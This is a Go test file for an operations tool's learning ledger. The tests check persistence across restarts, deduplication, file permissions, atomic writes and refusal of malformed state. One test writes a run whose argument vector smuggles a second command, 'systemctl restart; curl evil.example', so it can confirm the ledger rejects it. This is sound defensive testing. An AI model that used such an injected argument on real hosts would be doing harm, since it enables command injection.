package crystallizehook

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/vincent-wuhan/opskeeper/core/domain"
	"github.com/vincent-wuhan/opskeeper/core/manager/biz/aiops/crystallize"
)

func stateTools() ToolSpecSource {
	return fakeTools{"host.restart_service": {Name: "host.restart_service", RiskLevel: "L3"}}
}

func learnerAt(t *testing.T, path string) *Learner {
	t.Helper()
	l, err := New(stateTools(), Config{
		ToolClass:   classFromRisk,
		BlastRadius: domain.RadiusPod,
		TTL:         15 * time.Minute,
		StatePath:   path,
	}, nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return l
}

// TestTheStreakSurvivesARestart is the whole reason the store exists, stated as
// the failure it removes: two of the three clean runs a pattern needs are
// recorded, the process is replaced, and the third one has to be the run that
// promotes it.
//
// The control plane is restarted by deployments, by upgrades, by a crash and
// by an operator, and the promotion rule is three consecutive verifications.
// Without a durable ledger those two facts compose into a rule that no fault
// can ever satisfy on a fleet that restarts more often than a fault recurs —
// which is not a rule that is slow to pay off, it is one that never does.
func TestTheStreakSurvivesARestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested", "ledger.json")

	first := learnerAt(t, path)
	for _, m := range []int{1, 2} {
		if err := first.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn run %d: %v", m, err)
		}
	}
	if got := first.Ledger().Runs()[0].Streak; got != 2 {
		t.Fatalf("streak before the restart = %d, want 2", got)
	}
	if first.Ledger().Runs()[0].Promoted {
		t.Fatal("promoted on two runs; the threshold is three")
	}

	// The process is replaced: a brand new learner over the same path, with
	// nothing carried over in memory.
	second := learnerAt(t, path)
	runs := second.Ledger().Runs()
	if len(runs) != 1 {
		t.Fatalf("the replacement process has %d patterns, want the 1 that was recorded", len(runs))
	}
	if runs[0].Streak != 2 {
		t.Fatalf("streak after the restart = %d, want 2 — the replacement counted from zero", runs[0].Streak)
	}
	if len(runs[0].Evidence) != 2 {
		t.Fatalf("evidence after the restart has %d ids, want the 2 that were recorded", len(runs[0].Evidence))
	}

	if err := second.Learn(context.Background(), cleanEvidence(t, "inc-c", 3)); err != nil {
		t.Fatalf("Learn after the restart: %v", err)
	}
	if got := second.Ledger().Runs()[0]; !got.Promoted || got.Streak != 3 {
		t.Fatalf("after the third run: streak=%d promoted=%t, want 3 and true", got.Streak, got.Promoted)
	}
}

// TestARepeatedEvidenceIdIsStillDeduplicatedAfterARestart: the dedup set is
// rebuilt from the list rather than persisted separately, so the one thing it
// can get wrong is appending an id the file already holds. A re-run of the
// same incident is exactly that, and it happens on every retry.
func TestARepeatedEvidenceIdIsStillDeduplicatedAfterARestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ledger.json")
	first := learnerAt(t, path)
	for _, m := range []int{1, 2} {
		if err := first.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn: %v", err)
		}
	}
	// Replay one of the two that were recorded — a retry of the same
	// incident, which is what a re-run actually looks like. Replaying an id
	// the ledger never saw would grow the list for the right reason and
	// prove nothing.
	second := learnerAt(t, path)
	if err := second.Learn(context.Background(), cleanEvidence(t, "inc-b", 1)); err != nil {
		t.Fatalf("replaying a recorded incident: %v", err)
	}
	if got := len(second.Ledger().Runs()[0].Evidence); got != 2 {
		t.Fatalf("evidence has %d ids after replaying one, want 2", got)
	}
}

// TestTheStoreKeepsTheWholeRunThroughJSON: the file is the transport, and the
// two types it has to carry are the ones JSON is worst at — a duration and a
// float inside a nested struct. A round trip that quietly turned a 15-minute
// window into 900000000000 nanoseconds, or a 0.92 threshold into 0, would
// still parse, and both would be a decision about safety.
func TestTheStoreKeepsTheWholeRunThroughJSON(t *testing.T) {
	l := newTestLearner(t, stateTools())
	for _, m := range []int{1, 2, 3} {
		if err := l.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn: %v", err)
		}
	}
	want := l.Ledger().Runs()[0]

	store := NewFileStore(filepath.Join(t.TempDir(), "ledger.json"))
	if err := store.Save([]crystallize.Run{want}); err != nil {
		t.Fatalf("Save: %v", err)
	}
	got, err := store.Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("loaded %d runs, want 1", len(got))
	}
	r := got[0]
	if r.GrantedTTL != want.GrantedTTL {
		t.Fatalf("granted ttl = %s, want %s", r.GrantedTTL, want.GrantedTTL)
	}
	if r.Pattern.Action.Trigger.Threshold != want.Pattern.Action.Trigger.Threshold {
		t.Fatalf("trigger threshold = %v, want %v", r.Pattern.Action.Trigger.Threshold, want.Pattern.Action.Trigger.Threshold)
	}
	if r.Pattern.Action.Trigger.Metric != want.Pattern.Action.Trigger.Metric {
		t.Fatalf("trigger metric = %q, want %q", r.Pattern.Action.Trigger.Metric, want.Pattern.Action.Trigger.Metric)
	}
	if r.Pattern.Action.BlastRadius != want.Pattern.Action.BlastRadius {
		t.Fatalf("blast radius = %q, want %q", r.Pattern.Action.BlastRadius, want.Pattern.Action.BlastRadius)
	}
	if !r.PromotedAt.Equal(want.PromotedAt) {
		t.Fatalf("promoted at = %s, want %s", r.PromotedAt, want.PromotedAt)
	}
	if len(r.Evidence) != len(want.Evidence) {
		t.Fatalf("evidence has %d ids, want %d", len(r.Evidence), len(want.Evidence))
	}
	if !r.FirstSeen.Equal(want.FirstSeen) || !r.LastSeen.Equal(want.LastSeen) {
		t.Fatalf("seen window = %s..%s, want %s..%s", r.FirstSeen, r.LastSeen, want.FirstSeen, want.LastSeen)
	}
}

// TestTheStateFileHoldsNothingButRuns: the argv a trial contributed is the
// exact vector a human read when they approved the fix, and it is the most
// sensitive thing the crystalliser holds. The file is 0600 for the same
// reason, and this is the check that the mode stayed that way.
func TestTheStateFileHoldsNothingButRuns(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ledger.json")
	l := learnerAt(t, path)
	if err := l.Learn(context.Background(), cleanEvidence(t, "inc-a", 1)); err != nil {
		t.Fatalf("Learn: %v", err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("the state file was not written: %v", err)
	}
	if mode := info.Mode().Perm(); mode != 0o600 {
		t.Fatalf("state file mode = %04o, want 0600: it holds every argv the ledger learned", mode)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") {
			t.Fatalf("a temporary file was left behind: %s", e.Name())
		}
	}
}

// TestTheStateFileIsReplacedNotTruncated: the failure this store exists to
// avoid is a half-written file that parses as an empty ledger, because an
// empty ledger and a fresh install are the same bytes and the first is a
// silent loss of a promotion.
func TestTheStateFileIsReplacedNotTruncated(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ledger.json")
	store := NewFileStore(path)

	l := newTestLearner(t, stateTools())
	for _, m := range []int{1, 2, 3} {
		if err := l.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn: %v", err)
		}
	}
	if err := store.Save(l.Ledger().Runs()); err != nil {
		t.Fatalf("Save: %v", err)
	}
	first, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if err := store.Save(l.Ledger().Runs()); err != nil {
		t.Fatalf("Save again: %v", err)
	}
	second, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	var doc storeDoc
	if err := json.Unmarshal(second, &doc); err != nil {
		t.Fatalf("the rewritten file does not parse: %v", err)
	}
	if doc.Version != storeVersion || len(doc.Runs) != 1 {
		t.Fatalf("rewritten file has version %d and %d runs, want %d and 1", doc.Version, len(doc.Runs), storeVersion)
	}
	// The first write is what a reader would have seen mid-rename had the
	// write been in place rather than beside it.
	var firstDoc storeDoc
	if err := json.Unmarshal(first, &firstDoc); err != nil {
		t.Fatalf("the first file does not parse: %v", err)
	}
	if len(firstDoc.Runs) != 1 {
		t.Fatalf("the first file has %d runs, want 1", len(firstDoc.Runs))
	}
}

// TestNothingPersistedIsNotAnError: a deployment that has never recorded a
// trial passes through a missing file on every boot, and it is a state, not a
// failure.
func TestNothingPersistedIsNotAnError(t *testing.T) {
	store := NewFileStore(filepath.Join(t.TempDir(), "never-written.json"))
	runs, err := store.Load()
	if err != nil {
		t.Fatalf("Load on a missing file: %v", err)
	}
	if len(runs) != 0 {
		t.Fatalf("Load on a missing file returned %d runs, want 0", len(runs))
	}
	if _, err := os.Stat(store.Path()); !os.IsNotExist(err) {
		t.Fatal("Load created the file, and a store that wrote on read could not be told apart from one that restored something")
	}
}

// TestAFileFromAnotherBuildIsRefused: the version field exists so that a shape
// change is a refusal rather than a field this build silently skipped — and a
// skipped field is a decision the ledger forgot.
func TestAFileFromAnotherBuildIsRefused(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ledger.json")
	if err := os.WriteFile(path, []byte(`{"version":99,"savedAt":"2026-10-03T04:00:00Z","runs":[]}`), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	_, err := NewFileStore(path).Load()
	if err == nil {
		t.Fatal("Load accepted a document of an unknown version, want a refusal")
	}
	if !strings.Contains(err.Error(), "version 99") {
		t.Fatalf("error %v does not name the version it found", err)
	}
}

// TestAnUnreadableStateFileDoesNotStopTheControlPlane: the same trade the
// federation ledger makes, and for the same reason — degrading is what this
// package did before persistence existed, while refusing to boot takes a
// working feature away over a durability detail. The operator still has to be
// told, which is why this checks the runs still land.
func TestAnUnreadableStateFileDoesNotStopTheControlPlane(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ledger.json")
	if err := os.WriteFile(path, []byte("{not json"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	l := learnerAt(t, path)
	if l.store != nil {
		t.Fatal("a store was attached over an unreadable file")
	}
	if err := l.Learn(context.Background(), cleanEvidence(t, "inc-a", 1)); err != nil {
		t.Fatalf("the learner stopped recording: %v", err)
	}
	if len(l.Ledger().Runs()) != 1 {
		t.Fatal("the trial did not reach the ledger")
	}
}

// TestAnUnwritableStatePathDoesNotStopTheControlPlane: same trade, other
// direction — the path is fine as a path and cannot be written to.
func TestAnUnwritableStatePathDoesNotStopTheControlPlane(t *testing.T) {
	// A path under a regular file cannot be created, which is the portable
	// way to get a directory that does not exist and cannot be made.
	blocker := filepath.Join(t.TempDir(), "not-a-directory")
	if err := os.WriteFile(blocker, nil, 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	l := learnerAt(t, filepath.Join(blocker, "ledger.json"))
	if l.store != nil {
		t.Fatal("a store was attached over an unwritable path")
	}
	if err := l.Learn(context.Background(), cleanEvidence(t, "inc-a", 1)); err != nil {
		t.Fatalf("the learner stopped recording: %v", err)
	}
	if len(l.Ledger().Runs()) != 1 {
		t.Fatal("the trial did not reach the ledger")
	}
}

// TestNoStatePathMeansNoStore: the zero configuration has to keep working, and
// it is the configuration every other test in this package uses.
func TestNoStatePathMeansNoStore(t *testing.T) {
	l := newTestLearner(t, stateTools())
	if l.store != nil {
		t.Fatal("a store was attached with no path configured")
	}
	for _, m := range []int{1, 2, 3} {
		if err := l.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn: %v", err)
		}
	}
	if !l.Ledger().Runs()[0].Promoted {
		t.Fatal("an in-memory ledger stopped promoting")
	}
}

// TestAFailedWriteDoesNotTellTheLoopTheLearningFailed: the trial WAS recorded
// — the counters moved and a draft may have been earned — so an error here
// would misreport the run to a health surface and to the orchestrator, which
// is a worse lie than the narrower truth that the copy did not land.
func TestAFailedWriteDoesNotTellTheLoopTheLearningFailed(t *testing.T) {
	l := newTestLearner(t, stateTools())
	l.store = failingStore{}

	if err := l.Learn(context.Background(), cleanEvidence(t, "inc-a", 1)); err != nil {
		t.Fatalf("Learn returned %v, want nil: the trial was recorded", err)
	}
	if len(l.Ledger().Runs()) != 1 {
		t.Fatal("the trial did not reach the ledger")
	}
	if l.LastError() == nil {
		t.Fatal("the failed write is not on the health surface")
	}
}

// TestAFailedWriteStillWritesTheNextOne: a write that fails must not wedge
// the store. The next trial is the operator's evidence too, and losing the
// second because the first could not be copied would turn a disk problem
// into a decision problem.
func TestAFailedWriteStillWritesTheNextOne(t *testing.T) {
	l := newTestLearner(t, stateTools())
	store := &countingStore{}
	l.store = store

	for _, m := range []int{1, 2, 3} {
		if err := l.Learn(context.Background(), cleanEvidence(t, "inc-"+string(rune('a'+m)), m)); err != nil {
			t.Fatalf("Learn run %d: %v", m, err)
		}
	}
	if store.calls != 3 {
		t.Fatalf("the store was written %d times for 3 trials, want 3", store.calls)
	}
	if !l.Ledger().Runs()[0].Promoted {
		t.Fatal("an in-memory ledger stopped promoting while the copy was failing")
	}
}

// failingStore refuses every write and reads nothing.
type failingStore struct{}

func (failingStore) Path() string                     { return "/dev/null" }
func (failingStore) Load() ([]crystallize.Run, error) { return nil, nil }
func (failingStore) Save([]crystallize.Run) error     { return errWriteRefused }

// countingStore succeeds and remembers how often it was called.
type countingStore struct{ calls int }

func (*countingStore) Path() string { return "/dev/null" }
func (*countingStore) Load() ([]crystallize.Run, error) {
	return nil, nil
}
func (c *countingStore) Save([]crystallize.Run) error {
	c.calls++
	return nil
}

var errWriteRefused = errors.New("crystallizehook: this store refuses writes")

// TestARefusedStateFileDoesNotBecomeTheNextBoot: the three boot failures are
// not the same failure, and the third one is the dangerous one.
//
// A file that parses but holds a run the ledger could not have made — a
// hand-edited pattern, a truncated write from an older build, a policy that
// was tightened — is a document asking the boot to mint a runbook. Loading it
// and counting from zero is survivable. Loading it and then WRITING it back
// is not: the next boot reads the same refused document and the process
// before it has already overwritten whatever the operator had moved aside to
// recover from. So the store stays detached, and the file stays on disk for
// the operator to look at.
func TestARefusedStateFileDoesNotBecomeTheNextBoot(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ledger.json")

	// A run that Record would never have accepted: the argv carries a shell
	// metacharacter, so it could not have been a declaration.
	unusable := crystallize.Run{
		Pattern: crystallize.Pattern{
			Fault: crystallize.Fault{Kind: "host.disk_full", Family: "host"},
			Action: crystallize.Action{
				Tool:        "host_restart_service",
				Argv:        []string{"systemctl", "restart; curl evil.example"},
				Target:      "host:i-0abc123",
				BlastRadius: domain.RadiusPod,
				TTL:         15 * time.Minute,
			},
		},
		Attempts: 1,
		Verified: 1,
		Streak:   1,
	}
	store := NewFileStore(path)
	if err := store.Save([]crystallize.Run{unusable}); err != nil {
		t.Fatalf("Save: %v", err)
	}

	l := learnerAt(t, path)
	if l.store != nil {
		t.Fatal("a store was attached over a state file the ledger refused")
	}
	if len(l.Ledger().Runs()) != 0 {
		t.Fatal("a refused run reached the ledger")
	}
	if err := l.Learn(context.Background(), cleanEvidence(t, "inc-a", 1)); err != nil {
		t.Fatalf("the learner stopped recording: %v", err)
	}

	// The operator's file is still the one they have to look at.
	if _, err := store.Load(); err != nil {
		t.Fatalf("the refused file was rewritten: %v", err)
	}
	after, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("the refused file is gone: %v", err)
	}
	if !strings.Contains(string(after), "curl evil.example") {
		t.Fatal("the refused document was replaced, so the operator has nothing left to diagnose")
	}
}
